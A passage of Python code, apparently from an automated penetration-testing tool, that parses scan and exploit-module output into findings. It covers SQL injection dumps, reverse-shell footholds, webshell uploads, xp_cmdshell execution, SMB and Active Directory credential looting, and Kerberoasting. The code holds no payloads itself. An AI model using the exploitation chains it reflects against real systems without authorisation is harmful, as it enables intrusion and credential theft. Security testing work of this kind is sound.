        if key:
            groups.setdefault(key, [_VULN_SCRIPTS[key], set()])[1].add(port)
        low = (name or "").lower()
        if port in _TLS_PORTS or "ssl" in low or "https" in low or "tls" in low:
            groups.setdefault("ssl", [_SSL, set()])[1].add(port)
    return [(k, sc, sorted(ps)) for k, (sc, ps) in groups.items() if ps]


# Auth-category scripts whose mere output is a weakness → a one-line title each.
_AUTH_TITLE = {
    "ftp-anon": "anonymous FTP login allowed",
    "mysql-empty-password": "MySQL account with empty password",
    "ms-sql-empty-password": "MSSQL account with empty password",
    "http-default-accounts": "default web credentials found",
    "x11-access": "X11 server open (no auth)",
    "redis-info": "Redis reachable without auth",
    "mongodb-databases": "MongoDB reachable without auth",
    "rsync-list-modules": "rsync modules listable",
    "snmp-info": "SNMP readable (default community)",
}


def _extract_finding(sid: str, output: str) -> "dict | None":
    """Turn one NSE script result into a finding, or None. Covers three sources with
    no re-scan (the output is already in the DB): the standard `vuln` library format
    (State: VULNERABLE / LIKELY), auth scripts whose output implies a weakness, and a
    few info rules over -sC output (exposed .git, weak TLS, SMB signing, …)."""
    if not output:
        return None
    cves = sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", output)))
    cve = ",".join(cves) or None

    # 1) standard vuln library format
    if re.search(r"State:\s*VULNERABLE", output):
        state = "VULNERABLE"
    elif re.search(r"State:\s*LIKELY VULNERABLE", output):
        state = "LIKELY"
    else:
        state = None
    if state:
        m = re.search(r"Risk factor:\s*([A-Za-z]+)", output)
        risk = (m.group(1).upper() if m else "HIGH")
        # title = the line right after "VULNERABLE:" (the human name), if it isn't a
        # structured field; otherwise fall back to the script id.
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()]
        summary = sid
        for i, ln in enumerate(lines):
            if re.match(r"(LIKELY )?VULNERABLE:?$", ln, re.I) and i + 1 < len(lines):
                nxt = lines[i + 1]
                if not re.match(r"(State|IDs|Risk|Disclosure|References|Description|Extra)\b", nxt):
                    summary = nxt
                break
        return {"state": state, "cve": cve, "risk": risk, "summary": summary[:140]}

    # 2) auth-category scripts: any output = weakness
    if sid in _AUTH_TITLE:
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH", "summary": _AUTH_TITLE[sid]}

    # 2b) http-headers tool: fold the tech banner + missing security headers into one finding
    if sid == "http-headers":
        tech = []
        for hdr in ("Server", "X-Powered-By"):
            m = re.search(rf"^{hdr}:\s*(.+)$", output, re.I | re.M)
            if m:
                tech.append(m.group(1).strip())
        wanted = [("content-security-policy", "CSP"), ("x-frame-options", "X-Frame-Options"),
                  ("x-content-type-options", "X-Content-Type-Options")]
        if re.match(r"\s*https://", output, re.I):          # HSTS only matters over TLS
            wanted.append(("strict-transport-security", "HSTS"))
        missing = [short for hdr, short in wanted
                   if not re.search(rf"^{re.escape(hdr)}:", output, re.I | re.M)]
        parts = []
        if tech:
            parts.append("tech: " + ", ".join(tech))
        if missing:
            parts.append("missing sec-headers: " + ", ".join(missing))
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if missing else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2c) whatweb stack fingerprint: fold server / framework / CMS + versions into a finding
    if sid == "http-fingerprint":
        interesting = {
            "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
            "php", "asp.net", "x-powered-by", "python", "ruby", "django", "express", "laravel",
            "nodejs", "node.js", "wordpress", "drupal", "joomla", "magento", "mediawiki",
            "typo3", "moodle", "jenkins", "jira", "gitlab", "phpmyadmin",
        }
        tech, seen = [], set()
        for name, val in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", output):
            if name.lower() not in interesting:
                continue
            val = val.strip()
            item = f"{name} {val}" if val else name
            if item.lower() not in seen:
                seen.add(item.lower())
                tech.append(item)
        if tech:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": ("stack: " + ", ".join(tech))[:140]}
        return None

    # 2d) TLS cert (openssl / nmap ssl-cert): surface emails + self-signed note. SAN/CN
    #     hostnames go to the hostnames table via _extract_hostnames, not here.
    if sid == "ssl-cert":
        emails = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", output)))
        selfsigned = bool(re.search(r"self[- ]signed", output, re.I))
        parts = []
        if emails:
            parts.append("emails: " + ", ".join(emails))
        if selfsigned:
            parts.append("self-signed cert")
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if selfsigned else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2e) searchsploit: fold Exploit-DB candidate matches into one finding (leads, not proof)
    if sid == "searchsploit":
        titles = re.findall(r"^\[.*?\]\s*(.+?)\s*\(EDB-(\d+)\)", output, re.M)
        if not titles:
            return None
        items = [f"{t} (EDB-{e})" for t, e in titles]
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                "summary": ("exploits: " + "; ".join(items))[:140]}

    # 2f) http-source: fold mined secrets / endpoints / comments counts into one finding
    if sid == "http-source":
        def _count(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nsec, neps, ncom = _count("POTENTIAL SECRETS"), _count("ENDPOINTS"), _count("HTML COMMENTS")
        if not (nsec or neps or ncom):
            return None
        parts = []
        if nsec:
            labels = sorted(set(re.findall(r"^  ([a-z-]+):",
                            output[output.find("POTENTIAL SECRETS"):], re.M)))
            parts.append("secrets: " + (", ".join(labels) if labels else str(nsec)))
        if neps:
            parts.append(f"endpoints: {neps}")
        if ncom:
            parts.append(f"comments: {ncom}")
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if nsec else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2g) http-wellknown: fold robots/sitemap hidden paths + error-page tech leak into a finding
    if sid == "http-wellknown":
        def _c(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nrob, nsm, nwk = _c("ROBOTS PATHS"), _c("SITEMAP URLS"), _c("WELL-KNOWN")
        techm = re.search(r"^ERROR-PAGE TECH:\s*(.+)$", output, re.M)
        tech = techm.group(1).strip() if techm else ""
        if not (nrob or nsm or nwk or tech):
            return None
        parts = []
        if nrob:
            parts.append(f"robots: {nrob} paths")
        if nsm:
            parts.append(f"sitemap: {nsm} urls")
        if nwk:
            parts.append(f"well-known: {nwk}")
        if tech:
            parts.append("errorpage: " + tech)
        return {"state": "INFO", "cve": cve, "risk": "LOW" if (nrob or tech) else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2h) http-cookies: JWT compromise (alg:none / weak secret) or missing cookie flags
    if sid == "http-cookies":
        jwt_hi = re.findall(r"⚠ (alg:none[^\n]*|weak HS256 secret: '[^']+')", output)
        gaps = re.findall(r"^  ([^:]+): missing ([A-Za-z,]+)", output, re.M)
        parts = []
        if jwt_hi:
            parts.append("JWT: " + "; ".join(jwt_hi))
        if gaps:
            parts.append("cookies: " + ", ".join(f"{n} missing {m}" for n, m in gaps[:4]))
        if not parts:
            return None
        sensitive = any(("Secure" in m or "HttpOnly" in m) for _n, m in gaps)
        risk = "HIGH" if jwt_hi else ("MEDIUM" if sensitive else "LOW")
        return {"state": "EXPOSED" if jwt_hi else "INFO", "cve": cve, "risk": risk,
                "summary": (" · ".join(parts))[:140]}

    # 2i) vhost-fuzz: virtual hosts discovered on this IP (each may hold its own app/vuln)
    if sid == "vhost-fuzz":
        vhosts = re.findall(r"^  \+ ([A-Za-z0-9_.-]+)", output, re.M)
        if not vhosts:
            return None
        shown = ", ".join(vhosts[:6]) + (f" +{len(vhosts) - 6} more" if len(vhosts) > 6 else "")
        return {"state": "INFO", "cve": cve, "risk": "LOW",
                "summary": f"vhosts: {shown} ({len(vhosts)})"[:140]}

    # 2j) dir-brute: discovered paths/files; elevate when something sensitive turns up
    if sid == "dir-brute":
        hits = re.findall(r"^\s*\+ (\d{3})\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(f"{p} ({s})" for s, p in hits[:6]) + \
            (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        sensitive = any(_DIRB_SENSITIVE.search(p) for _s, p in hits)
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if sensitive else "LOW",
                "summary": f"paths: {shown} ({len(hits)})"[:140]}

    # 2k) vcs-hunt: exposed VCS / backups / secrets — high when source/creds/data can leak
    if sid == "vcs-hunt":
        hits = re.findall(r"^\s*[!+] \d{3}\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(hits[:6]) + (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        high = any(_VCS_HIGH_RE.search(p) for p in hits)
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if high else "MEDIUM",
                "summary": f"exposed: {shown} ({len(hits)})"[:140]}

    # 2l) param-hunt: hidden GET params; MEDIUM when a param name implies injection surface
    if sid == "param-hunt":
        groups = re.findall(r"^\s+(\S+?)\?\[([^\]]+)\]", output, re.M)
        if not groups:
            return None
        params = {p.strip() for _e, ps in groups for p in ps.split(",") if p.strip()}
        shown = "; ".join(f"{e}?[{ps}]" for e, ps in groups[:4]) + (" …" if len(groups) > 4 else "")
        danger = params & _PARAM_DANGEROUS
        summ = f"params: {shown} ({len(params)})"
        if danger:
            summ += " · risky: " + ",".join(sorted(danger)[:6])
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if danger else "LOW",
                "summary": summ[:140]}

    # 2m) default-creds: working default logins = immediate foothold → high
    if sid == "default-creds":
        hits = re.findall(r"^\s*! (\S+) @ (\S+) \((\w+)\)", output, re.M)
        if not hits:
            return None
        shown = "; ".join(f"{c} @ {p}" for c, p, _t in hits[:4]) + (" …" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"default creds: {shown} ({len(hits)})"[:140]}

    # 2n) auth-bypass: SQLi login bypass (highest) → DB error → user enumeration
    if sid == "auth-bypass":
        byp = re.findall(r"BYPASS (\S+)", output)
        err = re.findall(r"SQLERROR (\S+)", output)
        enum = re.findall(r"ENUM (\S+)", output)
        if byp:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi auth bypass: {', '.join(byp[:3])} ({len(byp)})"[:140]}
        if err:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi login (DB error): {', '.join(err[:3])} ({len(err)})"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                    "summary": f"user enumeration: {', '.join(enum[:3])} ({len(enum)})"[:140]}
        return None

    # 2o) login-brute: cracked creds (foothold) → high; lockout gate tripped → info
    if sid == "login-brute":
        cracked = re.findall(r"CRACKED (\S+) @ (\S+)", output)
        lock = re.findall(r"LOCKOUT (\S+)", output)
        if cracked:
            shown = "; ".join(f"{c} @ {p}" for c, p in cracked[:3]) + (" …" if len(cracked) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"brute-forced: {shown} ({len(cracked)})"[:140]}
        if lock:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"brute skipped — lockout: {', '.join(lock[:3])}"[:140]}
        return None

    # 2p) sqli-scan: injectable params (error/boolean/time) → sqlmap enum/dump
    if sid == "sqli-scan":
        pts = re.findall(r"✗ SQLI (\S+)", output)
        if not pts:
            return None
        dumped = "; dumped" if re.search(r"dumped: yes", output) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi: {shown} ({len(pts)}){dumped}"[:140]}

    # 2q) sqli-dump: OSCP-safe extraction — real data pulled = confirmed + looted
    if sid == "sqli-dump":
        pts = re.findall(r"✗ (\S+)", output)
        if not pts:
            return None
        db = re.search(r"db: (\S+)", output)
        looted = "; rows dumped" if re.search(r"^\s{8}\S", output, re.M) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        extra = (f"; db {db.group(1)}" if db else "") + looted
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi dump: {shown} ({len(pts)}){extra}"[:140]}

    # 2r) lfi-scan: local file read confirmed by content signature → high
    if sid == "lfi-scan":
        pts = re.findall(r"✗ LFI (\S+)", output)
        if not pts:
            return None
        caps = []
        if "/etc/passwd via" in output:
            caps.append("/etc/passwd")
        if "php://filter source readable" in output:
            caps.append("source")
        if "/proc/self/environ readable" in output:
            caps.append("environ")
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = (" · " + "+".join(caps)) if caps else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"LFI: {shown} ({len(pts)}){tail}"[:140]}

    # 2s) rfi-scan: wrapper inclusion with code execution (marker echoed) → RCE
    if sid == "rfi-scan":
        execs = re.findall(r"✗ RFI (\S+)", output)
        if not execs:
            return None
        shown = ", ".join(execs[:4]) + (f" +{len(execs) - 4}" if len(execs) > 4 else "")
        vtail = "; rev-shell verified" if "egress VERIFIED" in output else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"RFI RCE (wrapper): {shown} ({len(execs)}){vtail}"[:140]}

    # 2t) cmdi-scan: OS command injection (computed-marker or time) → RCE
    if sid == "cmdi-scan":
        pts = re.findall(r"✗ CMDI (\S+)", output)
        if not pts:
            return None
        mu = re.search(r"^\s+id: (uid=\S+)", output, re.M)
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = f" · {mu.group(1)}" if mu else ""
        if "egress VERIFIED" in output:
            tail += " · rev-shell verified"
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"OS cmd injection: {shown} ({len(pts)}){tail}"[:140]}

    # 2u) ssti-scan: template injection — RCE-confirmed (id) high, eval-only medium
    if sid == "ssti-scan":
        rce = re.findall(r"✗ SSTI (\S+)", output)
        eval_only = re.findall(r"⚠ SSTI (\S+)", output)
        if rce:
            eng = re.search(r"→ (\w+), RCE confirmed", output)
            uid = re.search(r"id: (uid=\S+)", output)
            shown = ", ".join(rce[:4]) + (f" +{len(rce) - 4}" if len(rce) > 4 else "")
            tail = (f"; {eng.group(1)}" if eng else "") + (f"; {uid.group(1)}" if uid else "")
            if "egress VERIFIED" in output:
                tail += "; rev-shell verified"
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SSTI RCE: {shown} ({len(rce)}){tail}"[:140]}
        if eval_only:
            shown = ", ".join(eval_only[:4]) + (f" +{len(eval_only) - 4}" if len(eval_only) > 4 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "MEDIUM",
                    "summary": f"SSTI (eval, RCE unconfirmed): {shown} ({len(eval_only)})"[:140]}
        return None

    # 2v) upload-shell: file-upload webshell — code-executed critical, merely-stored high
    if sid == "upload-shell":
        rce = re.findall(r"✗ UPLOAD (\S+)", output)
        stored = re.findall(r"⚠ UPLOAD (\S+)", output)
        if rce:
            var = re.search(r"✗ UPLOAD \S+\s+\(([^)]+)\)", output)
            vt = f" ({var.group(1)})" if var else ""
            shown = rce[0] + (f" +{len(rce) - 1}" if len(rce) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"File-upload RCE: {shown}{vt}"[:140]}
        if stored:
            shown = stored[0] + (f" +{len(stored) - 1}" if len(stored) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Arbitrary file upload (exec unconfirmed): {shown}"[:140]}
        return None

    # 2w) xxe-ssrf: metadata/file-read critical, OOB-confirmed SSRF/XXE high
    if sid == "xxe-ssrf":
        meta = re.findall(r"✗ SSRF-META (\S+)", output)
        s_oob = re.findall(r"✗ SSRF-OOB (\S+)", output)
        x_read = re.findall(r"✗ XXE-READ (\S+)", output)
        x_oob = re.findall(r"✗ XXE-OOB (\S+)", output)
        if x_read:
            shown = x_read[0] + (f" +{len(x_read) - 1}" if len(x_read) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"XXE file read: {shown}"[:140]}
        if meta:
            shown = meta[0] + (f" +{len(meta) - 1}" if len(meta) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"SSRF → cloud metadata: {shown}"[:140]}
        if s_oob or x_oob:
            bits = ([f"SSRF ({len(s_oob)})"] if s_oob else []) + ([f"XXE ({len(x_oob)})"] if x_oob else [])
            first = (s_oob or x_oob)[0]
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Out-of-band {' + '.join(bits)}: {first}"[:140]}
        return None

    # 2x) idor-bac: IDOR / broken access control / authz bypass high, enumerable-only info
    if sid == "idor-bac":
        idor = re.findall(r"✗ IDOR (\S+)", output)
        bac = re.findall(r"✗ BAC (\S+)", output)
        authz = re.findall(r"✗ AUTHZ-BYPASS (\S+)", output)
        enum = re.findall(r"⚠ ENUM (\S+)", output)
        if idor:
            authed = " [authenticated]" if "[authenticated as" in output else ""
            shown = idor[0] + (f" +{len(idor) - 1}" if len(idor) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"IDOR: {shown}{authed}"[:140]}
        if bac:
            shown = bac[0] + (f" +{len(bac) - 1}" if len(bac) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Broken access control (unauth): {shown}"[:140]}
        if authz:
            shown = authz[0] + (f" +{len(authz) - 1}" if len(authz) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"401/403 authz bypass: {shown}"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"Enumerable objects (verify for IDOR): {enum[0]}"[:140]}
        return None

    # 2y) cms-scan: vulnerable plugin/theme/core high, user enum info, detection info
    if sid == "cms-scan":
        vulns = re.findall(r"✗ CMS-VULN (.+)", output)
        users = re.search(r"⚠ CMS-USERS (.+)", output)
        cmsm = re.search(r"^CMS: (.+)$", output, re.M)
        if vulns:
            shown = vulns[0][:90] + (f" +{len(vulns) - 1}" if len(vulns) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"CMS vuln: {shown}"[:140]}
        if users:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"CMS user enumeration: {users.group(1)}"[:140]}
        if cmsm:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": f"CMS detected: {cmsm.group(1)}"[:140]}
        return None

    # 2z) admin-rce: authenticated admin panel → code execution
    if sid == "admin-rce":
        hits = re.findall(r"✗ ADMIN-RCE (\S+)", output)
        if hits:
            meth = re.search(r"✗ ADMIN-RCE \S+\s+\(([^)]+)\)", output)
            mt = f" ({meth.group(1)})" if meth else ""
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Authenticated admin RCE: {hits[0]}{mt}"[:140]}
        return None

    # 2aa) foothold: a reverse shell was fired over a confirmed RCE channel
    if sid == "foothold":
        m = re.search(r"foothold: fired (.+)$", output)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Reverse shell foothold: {m.group(1)}"[:140]}
        return None

    # 2ab) smb-enum: SMB signing not required / SMBv1 → relay & EternalBlue surface (high);
    # null/guest sessions & readable shares → exposed; otherwise the OS/domain banner is info.
    if sid == "smb-enum":
        conds, state, risk = [], "INFO", "LOW"
        if "signing NOT required" in output:
            conds.append("SMB signing not required (NTLM relay)")
            state, risk = "VULNERABLE", "HIGH"
        if "SMBv1 enabled" in output:
            conds.append("SMBv1 enabled (EternalBlue surface)")
            state, risk = "VULNERABLE", "HIGH"
        acc = re.search(r"Access:\s*(null session|guest) allowed", output)
        if acc:
            conds.append(f"{acc.group(1)} allowed")
            if state == "INFO":
                state, risk = "EXPOSED", "MEDIUM"
        rsh = [m.group(1) for m in re.finditer(r"^\s*(\S+)\s+(?:READ,WRITE|READ|WRITE)\b", output, re.M)
               if m.group(1).upper() not in ("IPC$", "SHARE", "SHARENAME", "DISK")]
        if rsh:
            conds.append("readable shares: " + ", ".join(dict.fromkeys(rsh))[:60])
            if state == "INFO":
                state, risk = "EXPOSED", "MEDIUM"
        if conds:
            return {"state": state, "cve": cve, "risk": risk, "summary": (" · ".join(conds))[:140]}
        mo = re.search(r"OS:\s*(.+)", output)
        if mo:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": ("SMB: " + mo.group(1).strip())[:140]}
        return None

    # 2ac) smb-vuln: confirmed unauth version-RCE (MS17-010 / MS08-067 / SMBGhost / DoublePulsar)
    if sid == "smb-vuln":
        hits = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"SMB RCE: {shown}"[:140]}

    # 2ad) smb-loot: creds recovered from shares (highest) → secrets → sensitive file inventory
    if sid == "smb-loot":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        files = re.findall(r"^· FILE ", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SMB loot creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"SMB loot secrets: {shown}"[:140]}
        if files:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
        return None

    # 2az) ftp-foothold: a shell path was taken (backdoor / web-rce / ssh-key)
    if sid == "ftp-foothold":
        mm = re.search(r"^ftp-foothold: (\w[\w-]* shell → .+)$", output, re.M)
        if mm:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {mm.group(1)}"[:140]}
        return None

    # 2ay) ftp-bounce: internal-only ports reachable through the FTP server (PORT bounce)
    if sid == "ftp-bounce":
        op = re.findall(r"^✗ BOUNCE 127\.0\.0\.1:(\d+) open\s+\(([^)]+)\)", output, re.M)
        if not op:
            return None
        shown = ", ".join(f"{p} {h}" for p, h in op[:6])
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"FTP bounce → internal: {shown}"[:140]}

    # 2ax) ftp-webshell: FTP-writable dir served by a web root → code execution
    if sid == "ftp-webshell":
        rcehits = re.findall(r"^✗ RCE (.+)$", output, re.M)
        served = re.findall(r"^✗ SERVED (.+)$", output, re.M)
        if rcehits:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"FTP→web RCE: {rcehits[0].strip()}"[:140]}
        if served:
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"FTP dir web-served: {served[0].strip()}"[:140]}
        return None

    # 2aw) ftp-creds: default / reused FTP login worked → immediate access
    if sid == "ftp-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"FTP creds: {shown}"[:140]}

    # 2av) ftp-write: anonymous-writable directory — webshell / payload-drop surface
    if sid == "ftp-write":
        w = re.findall(r"^✗ WRITABLE (\S+)", output, re.M)
        if not w:
            return None
        shown = ", ".join(dict.fromkeys(w))[:100]
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"anonymous-writable FTP dir(s): {shown}"[:140]}

    # 2au) ftp-anon: anonymous FTP access — high when it exposes interesting files
    if sid == "ftp-anon":
        if "anonymous login allowed" not in output:
            return None
        ni = len(re.findall(r"^! ", output, re.M))
        summ = "anonymous FTP login allowed" + (f" · {ni} interesting file(s)" if ni else "")
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if ni else "MEDIUM",
                "summary": summ[:140]}

    # 2bf) telnet-shell: an interactive telnet session was spawned (auto-login / no-auth)
    if sid == "telnet-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bq) mssql-loot: sql_login hashes / linked servers / file-read > db inventory
    if sid == "mssql-loot":
        hashes = re.findall(r"^✗ HASH ", output, re.M)
        linked = re.findall(r"^✗ LINKED (\S+)", output, re.M)
        fread = re.search(r"^✗ FILE-READ ", output, re.M)
        dbs = re.findall(r"^· DB ", output, re.M)
        bits = []
        if hashes:
            bits.append(f"{len(hashes)} sql_login hash(es)")
        if linked:
            bits.append(f"linked: {', '.join(linked[:3])}")
        if fread:
            bits.append("OPENROWSET file-read")
        if bits:
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"MSSQL loot: {'; '.join(bits)}"[:140]}
        if dbs:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"MSSQL: {len(dbs)} non-system database(s)"[:140]}
        return None

    # 2bp) mssql-shell: a PowerShell reverse shell was fired through xp_cmdshell
    if sid == "mssql-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MSSQL foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bo) mssql-exec: xp_cmdshell command execution confirmed
    if sid == "mssql-exec":
        mo = re.search(r"^✗ EXEC .*running as (.+)$", output, re.M)
        if mo:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MSSQL xp_cmdshell RCE as {mo.group(1).strip()}"[:140]}
        return None

    # 2bn) mssql-creds: sa/default/reused login → DB access (sysadmin = command exec)
    if sid == "mssql-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        admin = any("sysadmin" in h for h in hits)
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
                "summary": f"MSSQL creds: {shown}"[:140]}

    # 2bw) ldap-loot: LAPS/gMSA creds (high) > description secrets > bloodhound
    if sid == "ldap-loot":
        laps = re.findall(r"^✗ LAPS (\S+)", output, re.M)
        gmsa = re.findall(r"^✗ GMSA (\S+)", output, re.M)
        descs = re.findall(r"^✗ DESC ", output, re.M)
        if laps or gmsa:
            bits = []
            if laps:
                bits.append(f"LAPS: {', '.join(laps[:3])}")
            if gmsa:
                bits.append(f"gMSA: {', '.join(gmsa[:3])}")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"AD loot — {'; '.join(bits)}"[:140]}
        if descs:
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"AD: {len(descs)} password(s) in description fields"[:140]}
        return None

    # 2bv) ldap-roast: AS-REP / Kerberoast hashes → offline crack to domain creds
    if sid == "ldap-roast":
        asrep = re.findall(r"^✗ ASREP (\S+)", output, re.M)
        tgs = re.findall(r"^✗ TGS (\S+)", output, re.M)
        if not asrep and not tgs:
            return None
        bits = []
        if asrep:
            bits.append(f"AS-REP: {', '.join(asrep[:3])}")
        if tgs:
            bits.append(f"Kerberoast: {', '.join(tgs[:3])}")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"roastable ({'; '.join(bits)})"[:140]}

    # 2bu) ldap-enum: anonymous AD enumeration (exposed) → else domain/user info
    if sid == "ldap-enum":
        if re.search(r"^✗ ANON ", output, re.M):
            mu = re.search(r"·\s*users:\s*(\d+)", output)
            extra = f" · {mu.group(1)} users" if mu else ""
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"LDAP anonymous enumeration allowed{extra}"[:140]}
        md = re.search(r"domain:\s*(\S+)", output)
        mu = re.search(r"·\s*users:\s*(\d+)", output)
        if md and md.group(1) != "?":
            summ = f"AD domain {md.group(1)}" + (f" · {mu.group(1)} users" if mu else "")
            return {"state": "INFO", "cve": None, "risk": "LOW", "summary": summ[:140]}
        return None

    # 2bt) ssh-shell: a direct SSH session was opened with a proven cred
    if sid == "ssh-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"SSH foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bs) ssh-creds: reused/default SSH login worked → direct shell access
    if sid == "ssh-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SSH creds: {shown}"[:140]}

    # 2br) ssh-banner: libssh auth bypass (critical) → else version info
    if sid == "ssh-banner":
        vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if vulns:
